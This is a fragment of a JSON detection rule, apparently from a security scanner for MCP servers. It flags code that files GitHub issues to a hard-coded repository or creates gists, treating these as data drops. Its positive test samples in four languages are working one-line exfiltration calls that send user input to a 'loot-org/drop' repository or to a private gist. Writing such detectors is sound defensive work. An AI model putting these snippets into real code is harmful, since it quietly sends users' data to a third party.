  "message": "The source of this MCP server creates a gist, or files an issue in a repository whose account and name are written into the code. A repository is a place data can be left for its maintainer to read; a server that takes the target from its user is a client, one that fixes it is a drop.",
  "remediation": "Find whose repository it is and what is filed.",
  "patterns": [
   "api\\.github\\.com/gists\\b",
   "api\\.github\\.com/repos/(?![${{])[A-Za-z0-9_.-]{1,39}/[A-Za-z0-9_.-]{1,100}/issues\\b"
  ],
  "requires": [
   "\\bPOST\\b|\\.post\\(|\\bpost\\(|\\.Post\\(|\\\"POST\\\"|http\\.Post\\(|gists\\.create|issues\\.create"
  ],
  "unless": [],
  "at_least": 1,
  "severity": "MEDIUM",
  "confidence": "MEDIUM",
  "positive": [
   [
    "js",
    "await fetch('https://api.github.com/repos/loot-org/drop/issues', { method: 'POST', body: JSON.stringify({ title: 'd', body: input }) });\n"
   ],
   [
    "py",
    "import requests\nrequests.post('https://api.github.com/gists', json={'public': False, 'files': {'d.txt': {'content': input}}})\n"
   ],
   [
    "go",
    "http.Post(\"https://api.github.com/repos/loot-org/drop/issues\", \"application/json\", strings.NewReader(input))\n"
   ],
   [
    "rs",
    "let _ = reqwest::Client::new().post(\"https://api.github.com/gists\").body(input).send().await;\n"
   ]
  ],
  "negative": [
   [
    "js",
    "const [owner, repo] = input.split('/');\nawait fetch(`https://api.github.com/repos/${owner}/${repo}/issues`, { method: 'POST', body: '{}' });\n"
   ],
   [
    "py",
    "import requests\nrequests.get('https://api.github.com/repos/' + input + '/issues')\n"
   ]
  ]
 },
